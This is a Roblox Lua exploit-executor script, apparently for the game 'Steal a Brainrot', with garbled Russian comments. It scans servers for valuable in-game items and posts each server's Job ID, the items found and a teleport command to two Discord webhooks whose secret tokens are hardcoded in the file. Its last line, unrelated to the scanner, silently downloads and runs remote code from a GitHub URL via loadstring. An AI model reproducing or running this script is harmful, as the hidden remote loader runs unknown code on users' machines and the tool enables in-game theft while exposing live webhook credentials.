-- üéØ BRAINROT INCOME SCANNER v2.0 (–ü–û–õ–ù–ê–Ø –í–ï–†–°–ò–Ø)
-- –°–∫–∞–Ω–∏—Ä—É–µ—Ç –≤—Å–µ –æ–±—ä–µ–∫—Ç—ã –≤ Steal a Brainrot –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Discord

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ‚öôÔ∏è –ù–ê–°–¢–†–û–ô–ö–ò
local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s
local MIDDLE_PRIORITY_THRESHOLD = 100_000_000 -- 100M/s

-- Webhook URLs
local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421498530756952287/XKkzMBw09MJGBC9VMv6A5yMkE1IxYLtQWqq_bKXCiK0etZSuTvnOutuWRr9HQA7H6nv1'
local MIDDLE_PRIORITY_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1426282608710647952/bmfmWPMug07ht7nRa_QeCVi7tfItybezKVkZ2tmw7lsODttiUnSnYJArl6UchxqIbeyT'

print('üéØ Brainrot Scanner v2.0 | JobId:', game.JobId)

-- üéÆ –û–ë–™–ï–ö–¢–´ –° –≠–ú–û–î–ó–ò –ò –í–ê–ñ–ù–û–°–¢–¨–Æ
local OBJECTS = {
    ['Garama and Madundung'] = { emoji = 'üçù', important = true },
    ['Dragon Cannelloni'] = { emoji = 'üê≤', important = true },
    ['Nuclearo Dinossauro'] = { emoji = 'ü¶ï', important = true },
    ['Esok Sekolah'] = { emoji = 'üè†', important = true },
    ['La Supreme Combinasion'] = { emoji = 'üî´', important = true },
    ['Ketupat Kepat'] = { emoji = 'üçè', important = true },
    ['Strawberry Elephant'] = { emoji = 'üêò', important = true },
    ['Spaghetti Tualetti'] = { emoji = 'üöΩ', important = true },
    ['Ketchuru and Musturu'] = { emoji = 'üçæ', important = true },
    ['Tralaledon'] = { emoji = 'ü¶à', important = true },
    ['La Extinct Grande'] = { emoji = 'ü©ª', important = true },
    ['Tictac Sahur'] = { emoji = 'üï∞Ô∏è', important = true },
    ['Los Primos'] = { emoji = 'üôÜ‚Äç‚ôÇÔ∏è', important = true },
    ['Tang Tang Keletang'] = { emoji = 'üì¢', important = true },
    ['Money Money Puggy'] = { emoji = 'üê∂', important = true },
    ['Burguro And Fryuro'] = { emoji = 'üçî', important = true },
    ['Chillin Chili'] = { emoji = 'üå∂', important = true },
    ['La Secret Combinasion'] = { emoji = '‚ùì', important = true },
    ['Eviledon'] = { emoji = 'üò°', important = true },
    ['Los Mobilis'] = { emoji = 'ü´ò', important = true },
    ['La Spooky Grande'] = { emoji = 'üéÉ', important = true },
    ['Spooky and Pumpky'] = { emoji = 'ü¶á', important = true },
    ['Chicleteira Bicicleteira'] = { emoji = 'üö≤', important = true },
    ['Los Combinasionas'] = { emoji = '‚öíÔ∏è', important = true },
    ['La Grande Combinasion'] = { emoji = '‚ùóÔ∏è', important = true },
}

-- –°–æ–∑–¥–∞–µ–º —Å–ø–∏—Å–æ–∫ –í–°–ï–• –≤–∞–∂–Ω—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤
local IMPORTANT_OBJECTS = {}
for name, cfg in pairs(OBJECTS) do
    if cfg.important then
        IMPORTANT_OBJECTS[name] = true
    end
end

-- üí∞ –ü–ê–†–°–ï–† –î–û–•–û–î–ê
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    
    -- –£–±–∏—Ä–∞–µ–º $, –∑–∞–ø—è—Ç—ã–µ –∏ –ø—Ä–æ–±–µ–ª—ã
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    
    -- –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        -- –ü—Ä–æ–±—É–µ–º –±–µ–∑ /s
        num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)$')
    end
    
    if not num then
        return nil
    end
    
    local val = tonumber(num)
    if not val then
        return nil
    end
    
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- üìù –ü–û–õ–£–ß–ï–ù–ò–ï –¢–ï–ö–°–¢–ê –ò–ó UI
local function grabText(inst)
    if not inst then
        return nil
    end
    
    local success, result = pcall(function()
        if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
            local text = inst.Text
            if type(text) == 'string' and #text > 0 then
                return text
            end
        end
        return nil
    end)
    
    return success and result or nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local genText = nil

    -- –ò—â–µ–º –∏–º—è
    for _, child in ipairs(animalOverhead:GetDescendants()) do
        if not name and (child:IsA('TextLabel') or child:IsA('TextButton')) then
            local text = grabText(child)
            if text and #text > 0 and not text:match('/s') and not text:match('%$') then
                name = text
            end
        end
        
        -- –ò—â–µ–º —Ç–µ–∫—Å—Ç —Å –¥–æ—Ö–æ–¥–æ–º
        if not genText and (child:IsA('TextLabel') or child:IsA('TextButton')) then
            local text = grabText(child)
            if text and (text:match('/s') or text:match('%$')) then
                genText = text
            end
        end
    end

    return name, genText
end

-- üîç –ü–û–õ–ù–´–ï –°–ö–ê–ù–ï–†–´
local function scanAllObjects()
    local results = {}
    
    -- –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –ø–æ–∏—Å–∫ –≤—Å–µ—Ö AnimalOverhead
    local function scanRecursive(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:lower():match('animal') then
                local name, genText = getOverheadInfo(child)
                if name and genText then
                    local genNum = parseGenerationText(genText)
                    if genNum then
                        table.insert(results, {
                            name = name,
                            gen = genNum,
                            location = 'World'
                        })
                    end
                end
            end
            scanRecursive(child)
        end
    end
    
    -- –°–∫–∞–Ω–∏—Ä—É–µ–º workspace –∏ PlayerGui
    scanRecursive(workspace)
    
    if Players.LocalPlayer then
        local playerGui = Players.LocalPlayer:FindFirstChild('PlayerGui')
        if playerGui then
            scanRecursive(playerGui)
        end
    end
    
    return results
end

-- üì§ DISCORD –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø
local function getRequester()
    return http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
end

local function sendDiscordNotification(objects, webhookUrl, isMiddlePriority)
    local req = getRequester()
    if not req then
        warn('‚ùå –ù–µ—Ç HTTP API –≤ executor')
        return false
    end

    if #objects == 0 then
        return false
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    -- –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –¥–æ—Ö–æ–¥—É (—É–±—ã–≤–∞–Ω–∏–µ)
    table.sort(objects, function(a, b)
        return a.gen > b.gen
    end)

    -- –§–æ—Ä–º–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –æ–±—ä–µ–∫—Ç–æ–≤
    local objectsList = {}
    for i = 1, math.min(10, #objects) do
        local obj = objects[i]
        local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or 'üí∞'
        local isImportant = IMPORTANT_OBJECTS[obj.name] and true or false
        
        local mark = isImportant and '‚≠ê ' or ''
        table.insert(
            objectsList,
            string.format(
                '%s%s **%s** (%s)',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen)
            )
        )
    end
    
    local objectsText = table.concat(objectsList, '\n')

    -- –¢–µ–ª–µ–ø–æ—Ä—Ç –∫–æ–º–∞–Ω–¥–∞
    local teleportText = string.format(
        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
        placeId,
        jobId
    )

    local title = isMiddlePriority and 'üíé –ù–∞–π–¥–µ–Ω—ã –æ–±—ä–µ–∫—Ç—ã —Å –ø—Ä–∏–±—ã–ª—å—é –æ—Ç 100M/s!' or 'üíé –ù–∞–π–¥–µ–Ω—ã –≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã!'
    local color = isMiddlePriority and 0x00ff00 or 0x2f3136
    local footerText = isMiddlePriority and 
        string.format('–ù–∞–π–¥–µ–Ω–æ: %d –æ–±—ä–µ–∫—Ç–æ–≤ –æ—Ç 100M/s ‚Ä¢ %s', #objects, os.date('%H:%M:%S')) :
        string.format('–ù–∞–π–¥–µ–Ω–æ: %d –≤–∞–∂–Ω—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤ ‚Ä¢ %s', #objects, os.date('%H:%M:%S'))

    local payload = {
        username = 'üéØ Brainrot Scanner',
        embeds = {
            {
                title = title,
                color = color,
                fields = {
                    {
                        name = 'üÜî –°–µ—Ä–≤–µ—Ä (Job ID)',
                        value = string.format('```%s```', jobId),
                        inline = false,
                    },
                    {
                        name = 'üí∞ –û–±—ä–µ–∫—Ç—ã:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = 'üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç:',
                        value = teleportText,
                        inline = false,
                    },
                },
                footer = {
                    text = footerText,
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }

    print('üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å', #objects, '–æ–±—ä–µ–∫—Ç–∞–º–∏')

    local success, result = pcall(function()
        return req({
            Url = webhookUrl,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if success then
        print('‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!')
        return true
    else
        warn('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', result)
        return false
    end
end

-- üéÆ –ì–õ–ê–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
local function scanAndNotify()
    print('üîç –ù–∞—á–∏–Ω–∞—é —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...')
    
    local allFound = scanAllObjects()
    print('üìä –ù–∞–π–¥–µ–Ω–æ –æ–±—ä–µ–∫—Ç–æ–≤:', #allFound)
    
    -- –í—ã–≤–æ–¥–∏–º –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    for _, obj in ipairs(allFound) do
        print(string.format('   %s: %s', obj.name, formatIncomeNumber(obj.gen)))
    end

    -- –§–ò–õ–¨–¢–†–ê–¶–ò–Ø:
    local importantObjects = {} -- –í—Å–µ –≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã (–ª—é–±–∞—è –ø—Ä–∏–±—ã–ª—å)
    local highIncomeObjects = {} -- –ù–µ–≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã ‚â•500M/s
    local middleIncomeObjects = {} -- –ù–µ–≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã ‚â•100M/s

    for _, obj in ipairs(allFound) do
        if IMPORTANT_OBJECTS[obj.name] then
            -- –í–ê–ñ–ù–´–ï –û–ë–™–ï–ö–¢–´ - –ª—é–±–∞—è –ø—Ä–∏–±—ã–ª—å
            table.insert(importantObjects, obj)
        else
            -- –ù–ï–í–ê–ñ–ù–´–ï –û–ë–™–ï–ö–¢–´ - —Ñ–∏–ª—å—Ç—Ä—É–µ–º –ø–æ –ø—Ä–∏–±—ã–ª–∏
            if obj.gen >= HIGH_PRIORITY_THRESHOLD then
                table.insert(highIncomeObjects, obj)
            elseif obj.gen >= MIDDLE_PRIORITY_THRESHOLD then
                table.insert(middleIncomeObjects, obj)
            end
        end
    end

    -- –û–±—ä–µ–¥–∏–Ω—è–µ–º –≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã –∏ –Ω–µ–≤–∞–∂–Ω—ã–µ ‚â•500M/s –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –≤–µ–±—Ö—É–∫–∞
    local mainWebhookObjects = {}
    for _, obj in ipairs(importantObjects) do
        table.insert(mainWebhookObjects, obj)
    end
    for _, obj in ipairs(highIncomeObjects) do
        table.insert(mainWebhookObjects, obj)
    end

    print('‚≠ê –í–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã (–ª—é–±–∞—è –ø—Ä–∏–±—ã–ª—å):', #importantObjects)
    print('üî• –ù–µ–≤–∞–∂–Ω—ã–µ ‚â•500M/s:', #highIncomeObjects)
    print('üíö –ù–µ–≤–∞–∂–Ω—ã–µ ‚â•100M/s:', #middleIncomeObjects)
    print('üì§ –û—Å–Ω–æ–≤–Ω–æ–π –≤–µ–±—Ö—É–∫:', #mainWebhookObjects)
    print('üì§ –í—Ç–æ—Ä–æ–π –≤–µ–±—Ö—É–∫:', #middleIncomeObjects)

    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
    if #mainWebhookObjects > 0 then
        sendDiscordNotification(mainWebhookObjects, DISCORD_WEBHOOK_URL, false)
    else
        print('üîç –ù–µ—Ç –æ–±—ä–µ–∫—Ç–æ–≤ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –≤–µ–±—Ö—É–∫–∞')
    end

    if #middleIncomeObjects > 0 then
        sendDiscordNotification(middleIncomeObjects, MIDDLE_PRIORITY_WEBHOOK_URL, true)
    else
        print('üîç –ù–µ—Ç –æ–±—ä–µ–∫—Ç–æ–≤ –¥–ª—è –≤—Ç–æ—Ä–æ–≥–æ –≤–µ–±—Ö—É–∫–∞')
    end
end

-- üöÄ –ó–ê–ü–£–°–ö
print('üéØ === BRAINROT INCOME SCANNER –ó–ê–ü–£–©–ï–ù ===')
print('‚≠ê –í–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã (–ª—é–±–∞—è –ø—Ä–∏–±—ã–ª—å) ‚Üí –æ—Å–Ω–æ–≤–Ω–æ–π –≤–µ–±—Ö—É–∫')
print('üíö –ù–µ–≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã ‚â•100M/s ‚Üí –≤—Ç–æ—Ä–æ–π –≤–µ–±—Ö—É–∫')
print('üî• –ù–µ–≤–∞–∂–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã ‚â•500M/s ‚Üí –æ—Å–Ω–æ–≤–Ω–æ–π –≤–µ–±—Ö—É–∫')

-- –ó–∞–ø—É—Å–∫–∞–µ–º —Å—Ä–∞–∑—É
scanAndNotify()

-- ‚å®Ô∏è –ü–û–í–¢–û–† –ü–û –ö–õ–ê–í–ò–®–ï F
local lastScan = 0
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.time()
        if now - lastScan >= 3 then
            lastScan = now
            print('\nüîÑ –ü–æ–≤—Ç–æ—Ä–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ (F)')
            scanAndNotify()
        end
    end
end)

print('üí° –ù–∞–∂–º–∏—Ç–µ F –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (–∑–∞–¥–µ—Ä–∂–∫–∞ 3 —Å–µ–∫)')
loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
